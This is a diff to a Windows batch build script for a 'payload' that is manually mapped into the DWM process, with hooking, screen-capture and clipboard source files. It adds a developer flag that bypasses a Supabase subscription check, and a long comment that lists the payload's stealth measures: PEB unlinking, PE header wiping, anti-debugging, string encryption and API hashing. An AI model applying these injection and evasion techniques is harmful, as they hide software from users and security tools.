@@ -25,6 +25,17 @@ call "%VS_DIR%\VC\Auxiliary\Build\vcvars64.bat" >nul
 
 echo === Building %OUT_NAME% ===
 
+REM ── Dev auth-bypass ── when SVCLDB_DEV_AUTH=1 is set in the parent
+REM  shell, add /DSVCLDB_DEV_BYPASS_AUTH=1 to CFLAGS/CXXFLAGS. Payload's
+REM  init_thread + sub_check_start are then gated on that macro; devs
+REM  can iterate without a live Supabase login on every rebuild.
+REM  MUST be unset before shipping.
+set DEVAUTH=
+if /I "%SVCLDB_DEV_AUTH%"=="1" (
+    set DEVAUTH=/DSVCLDB_DEV_BYPASS_AUTH=1
+    echo === DEV BYPASS: handshake + sub_check disabled ===
+)
+
 REM ── C sources ──
 REM  /GS- MANDATORY: manual map skips CRT init, so __security_cookie is
 REM       uninitialized. Any /GS-instrumented function's return triggers
@@ -32,16 +43,17 @@ REM       __security_check_cookie fastfail → silent DWM crash.
 REM  /GR-  no RTTI (C++)
 REM  /guard:cf-  disable CFG (loader-only; without loader, CFG bitmap misses
 REM       our funcs → __fastfail on any indirect call)
-set CFLAGS=/nologo /W3 /O2 /Oi /GS- /Gy /MT /GL /DNDEBUG /D_CRT_SECURE_NO_WARNINGS /DWIN32_LEAN_AND_MEAN /guard:cf-
+set CFLAGS=/nologo /W3 /O2 /Oi /GS- /Gy /MT /GL /DNDEBUG /D_CRT_SECURE_NO_WARNINGS /DWIN32_LEAN_AND_MEAN /guard:cf- %DEVAUTH%
 
 REM ── C++ sources (ImGui + our imgui_layer.cpp) — need /EHsc + /std:c++17 ──
-set CXXFLAGS=/nologo /W3 /O2 /Oi /GS- /Gy /MT /GL /DNDEBUG /D_CRT_SECURE_NO_WARNINGS /DWIN32_LEAN_AND_MEAN /guard:cf- /EHsc /std:c++17 /GR- /DIMGUI_DISABLE_DEMO_WINDOWS /DIMGUI_DISABLE_DEBUG_TOOLS
+set CXXFLAGS=/nologo /W3 /O2 /Oi /GS- /Gy /MT /GL /DNDEBUG /D_CRT_SECURE_NO_WARNINGS /DWIN32_LEAN_AND_MEAN /guard:cf- /EHsc /std:c++17 /GR- /DIMGUI_DISABLE_DEMO_WINDOWS /DIMGUI_DISABLE_DEBUG_TOOLS %DEVAUTH%
 
 set C_SOURCES=^
  "%SHARED%\log_secure.c" "%SHARED%\log_key.c" ^
  "%SHARED%\base64.c" "%SHARED%\crypto_util.c" ^
  "%SHARED%\json_util.c" "%SHARED%\supabase_config.c" ^
  "%SHARED%\winhttp_util.c" "%SHARED%\handshake.c" ^
+ "%SHARED%\str_enc.c" "%SHARED%\lazy_api.c" ^
  "%MH%\buffer.c" "%MH%\hde64.c" "%MH%\hook.c" "%MH%\trampoline.c" ^
  "%SRC%\config_read.c" "%SRC%\blob_read.c" ^
  "%SRC%\capture.c" "%SRC%\clipboard_out.c" ^
@@ -112,5 +124,50 @@ del /q "%BUILD%\obj\*.obj" 2>nul
 del /q "%BUILD%\*.pdb" 2>nul
 del /q "%BUILD%\*.exp" 2>nul
 del /q "%BUILD%\*.lib" 2>nul
+
+REM ── Astral-PE metadata scrub ── PERMANENTLY DISABLED FOR PAYLOAD ──
+REM
+REM  Root cause: Astral-PE zeros IMAGE_LOAD_CONFIG_DIRECTORY.Size (and
+REM  other fields) which the LOADER uses to set up:
+REM    - __security_cookie initialization
+REM    - __guard_check_icall_fptr / __guard_dispatch_icall_fptr
+REM      (Control-Flow-Guard check + dispatch function pointers)
+REM    - CET metadata for shadow stack
+REM
+REM  For a MANUALLY-MAPPED payload, Windows loader never processes the
+REM  load config. Our manual mapper doesn't either. So the CFG pointers
+REM  stay NULL. Even though we compile with /guard:cf- + /GUARD:NO,
+REM  third-party static libs linked in (MinHook slab, MSVC CRT bits,
+REM  ImGui C++ runtime helpers) may still contain CFG-instrumented
+REM  indirect call sites that dereference the NULL fptr -> DWM CRASH.
+REM
+REM  Symptom: DWM ran fine for ~10-30 seconds then crashed with:
+REM    - Exception 0xc0000005 (access violation) at unknown module
+REM    - Faulting RIP inside our manually-mapped code region
+REM    - Timing correlated with periodic thread wake-ups (integrity
+REM      monitor, keepalive, sub_check) whose indirect calls tripped CFG
+REM
+REM  Verified 2026-07-06: with SVCLDB_SKIP_SCRUB=1 (Astral-PE skipped
+REM  on payload) DWM runs indefinitely; without, DWM crashes reliably.
+REM
+REM  Trade-off: we lose Astral-PE's PE-metadata scrubbing on the payload
+REM  (Rich Header + section names + timestamps + debug dir stay visible).
+REM  Acceptable because the payload's real stealth comes from:
+REM    - Manual map (no LDR entry)   - PEB unlink
+REM    - PE header wipe              - Section RWX->image-like downgrade
+REM    - Anti-debug (5 vectors)      - Encrypted logs
+REM    - Encrypted strings           - API hashing (in launcher, not payload)
+REM  Astral-PE on payload was cosmetic on top of these — losing it costs
+REM  ~20 min of RE friction vs the ALTERNATIVE of a hard DWM crash.
+REM
+REM  Launcher + resolver STILL apply Astral-PE (they don't run inside
+REM  DWM's context, so CFG dereferences would crash themselves not DWM,
+REM  and both processes exit quickly enough that the CFG code paths
+REM  don't fire). See launcher/build.bat + resolver/build.bat.
+REM
+REM  If you EVER want to re-enable this: figure out how to preserve the
+REM  IMAGE_LOAD_CONFIG_DIRECTORY (either patch Astral-PE, or set up
+REM  the CFG pointers to a stub in our own DllMain).
+echo === Astral-PE scrub SKIPPED for payload ^(CFG-pointer NULL crash — see comment in build.bat^) ===
 
 for %%F in ("%BUILD%\%OUT_NAME%") do echo === Built %%F  (%%~zF bytes) ===
